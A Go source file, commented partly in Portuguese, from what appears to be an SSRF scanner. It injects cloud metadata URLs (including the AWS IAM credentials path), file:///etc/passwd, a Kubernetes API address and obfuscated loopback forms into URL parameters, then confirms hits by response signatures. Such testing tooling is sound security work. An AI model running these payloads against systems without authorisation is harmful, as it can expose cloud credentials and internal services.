package main

import (
	"regexp"
	"strings"
)

// ssrfTarget is one internal/well-known resource we ask the target server to
// fetch on our behalf. confirm(), when non-nil, looks at the response body
// for a signature that could ONLY appear if the server actually reached that
// resource — that's what turns "we injected a payload" into a confirmed
// finding instead of a guess. Targets without a confirm() func (none here
// currently — kept possible for future additions) fall back to the
// differential check in probe().
type ssrfTarget struct {
	Label   string // nome curto pro finding/evidência
	URL     string // valor injetado no parâmetro
	Sev     string // severidade quando confirmado
	confirm func(body string) bool
}

// awsMetaRe/etc match distinctive fragments of each service's real response
// body — chosen to be near-impossible to produce by coincidence from an
// unrelated page (a normal 404/error page won't contain 3 of these at once).
var (
	awsMetaKeys = []string{"ami-id", "instance-id", "local-hostname", "security-credentials", "placement/", "public-keys"}
	// "computeMetadata" foi removido de propósito — é substring literal da
	// própria URL injetada (.../computeMetadata/v1/), então confirmava sozinho
	// em qualquer página que ecoasse a URL de volta (mesmo bug corrigido em
	// aws-metadata-iam-creds; ver TestConfirmNeverTriggersOnReflectedURLAlone).
	gcpMetaKeys   = []string{"instance/service-accounts", "project/project-id"}
	azureMetaKeys = []string{"\"compute\"", "\"osType\"", "\"vmId\"", "azEnvironment"}
	etcPasswdRe   = regexp.MustCompile(`root:.*:0:0:`)
	// alibabaMetaKeys: campos exclusivos do formato de metadata da Alibaba
	// Cloud (endpoint próprio 100.100.100.200, não o 169.254.169.254 comum
	// a AWS/GCP/Azure/OCI/DO) — "region-id"/"owner-account-id" não aparecem
	// nas outras clouds, evita colisão cruzada.
	alibabaMetaKeys = []string{"region-id", "owner-account-id", "serial-number"}
	// ociMetaKeys: campos exclusivos do JSON de metadata da Oracle Cloud
	// Infrastructure (mesmo IP 169.254.169.254 das outras, path próprio).
	ociMetaKeys = []string{"compartmentId", "availabilityDomain", "ociAdName"}
	// k8sAPIKeys: mesmo sem token, o API server do Kubernetes responde com
	// um JSON de erro reconhecível ("kind":"Status", "system:anonymous") —
	// confirma que a requisição realmente alcançou o control plane do
	// cluster, não só um 404 genérico de algum outro serviço na porta 443.
	k8sAPIKeys = []string{"\"kind\":\"Status\"", "system:anonymous", "system:serviceaccount"}
)

func countHits(body string, keys []string) int {
	n := 0
	for _, k := range keys {
		if strings.Contains(body, k) {
			n++
		}
	}
	return n
}

// SSRFTargets is the fixed set of internal resources tested against every
// candidate parameter. Order matters a little: cheaper/more common checks
// first, since probe() stops at the first confirmed hit per parameter.
func ssrfTargets() []ssrfTarget {
	return []ssrfTarget{
		{
			Label: "aws-metadata", URL: "http://169.254.169.254/latest/meta-data/", Sev: "critical",
			confirm: func(body string) bool { return countHits(body, awsMetaKeys) >= 2 },
		},
		// aws-metadata-iam-creds: SEM confirm() de propósito (bug real corrigido
		// aqui — ver TestConfirmNeverTriggersOnReflectedURLAlone). A resposta
		// real desse path (sem role name) é só o nome da role em texto puro —
		// não existe assinatura de conteúdo genérica pra isso, e usar
		// "security-credentials" (que já estava em awsMetaKeys) confirmava
		// sozinho em qualquer página que ecoasse a própria URL injetada de
		// volta (canonical tag, mensagem de erro), sem o servidor nunca ter
		// buscado o recurso. Vira candidato (diferencial contra baseline),
		// igual localhost/loopback logo abaixo — confirmação de verdade exige
		// olhar a resposta manualmente.
		{Label: "aws-metadata-iam-creds", URL: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", Sev: "medium"},
		{
			Label: "file-etc-passwd", URL: "file:///etc/passwd", Sev: "critical",
			confirm: func(body string) bool { return etcPasswdRe.MatchString(body) },
		},
		{
			// GCP/Azure exigem um header (Metadata-Flavor / Metadata) que só o
			// app de destino manda — o atacante não controla isso injetando só
			// a URL. Ainda vale testar: alguns proxies/libs de fetch propagam
			// certos headers, e o custo de mais uma requisição é baixo.
			Label: "gcp-metadata", URL: "http://169.254.169.254/computeMetadata/v1/", Sev: "critical",
			confirm: func(body string) bool { return countHits(body, gcpMetaKeys) >= 1 },
		},
		{
			Label: "azure-metadata", URL: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", Sev: "critical",
			confirm: func(body string) bool { return countHits(body, azureMetaKeys) >= 2 },
		},
		{
			Label: "alibaba-metadata", URL: "http://100.100.100.200/latest/meta-data/", Sev: "critical",
			confirm: func(body string) bool { return countHits(body, alibabaMetaKeys) >= 1 },
		},
		{
			Label: "oci-metadata", URL: "http://169.254.169.254/opc/v1/instance/", Sev: "critical",
			confirm: func(body string) bool { return countHits(body, ociMetaKeys) >= 1 },
		},
		{
			// serviço do Kubernetes sempre resolvível de DENTRO de um pod (DNS
			// interno do cluster) — confirmação prova que o servidor alvo roda
			// num cluster k8s e o SSRF alcança o control plane, mesmo sem token.
			Label: "k8s-api-server", URL: "https://kubernetes.default.svc/version", Sev: "critical",
			confirm: func(body string) bool { return countHits(body, k8sAPIKeys) >= 1 },
		},
		// localhost/loopback não tem assinatura genérica de conteúdo — vira
		// candidato (probe() decide por diferencial contra o baseline), nunca
		// finding confirmado sozinho. As variantes decimal/hex existem pra não
		// desistir cedo demais de um filtro que só bloqueia a string literal
		// "127.0.0.1"/"localhost" — ambas resolvem pro mesmo endereço, mas não
		// batem numa blacklist de string ingênua.
		{Label: "localhost", URL: "http://127.0.0.1/", Sev: "medium"},
		{Label: "localhost-name", URL: "http://localhost/", Sev: "medium"},
		{Label: "ipv6-loopback", URL: "http://[::1]/", Sev: "medium"},
		{Label: "localhost-decimal", URL: "http://2130706433/", Sev: "medium"},
		{Label: "localhost-hex", URL: "http://0x7f000001/", Sev: "medium"},
	}
}

// builtinParams — nomes de parâmetro classicamente usados por código que
// busca uma URL no servidor (webhook, import, proxy, thumbnail, avatar por
// URL…). Difere da lista do scan-open-redirect: lá é "pra onde eu mando o
// usuário", aqui é "que URL o SERVIDOR vai buscar por mim".
var builtinParams = []string{
	"url", "uri", "path", "dest", "destination", "redirect", "redirect_uri",
	"continue", "return", "return_url", "callback", "webhook", "webhook_url",
	"notify_url", "feed", "feed_url", "source", "source_url", "src", "img",
	"image", "image_url", "avatar", "avatar_url", "thumbnail", "thumbnail_url",
	"preview", "preview_url", "proxy", "proxy_url", "fetch", "fetch_url",
	"load", "file", "document", "template", "host", "target", "to", "out",
	"link", "u", "resource", "endpoint", "api_url", "site", "domain",
}
